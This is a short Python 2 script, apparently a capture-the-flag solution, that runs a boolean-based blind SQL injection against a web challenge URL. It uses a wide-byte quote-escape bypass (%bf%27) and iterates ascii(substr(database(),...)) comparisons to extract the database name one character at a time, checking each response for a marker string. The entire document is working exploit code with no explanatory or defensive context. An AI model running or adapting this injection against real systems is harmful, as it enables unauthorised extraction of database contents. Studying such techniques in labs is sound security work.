import urllib,re

def start(url,i):
    r = urllib.urlopen(url)
    text = r.read()
    #print text
    if(re.search(key,text)):
        print chr(i),
    urlben = ""
    url = ""

urlroot = "http://sql.sycsec.com/f8077f08525d33bd7f0b1fd98b53dc59/?uid=%bf%27"
url1 = " or ascii(substr(database(),"
url2 = ",1))="
url3 = " # "
key = "look me,look me,look me."

for x in range(1,5):
    urlmid = url1+str(x)
    for i in range(128):
        url = urlroot+urllib.quote_plus(urlmid+url2+str(i)+url3)
        #print url
        start(url,i)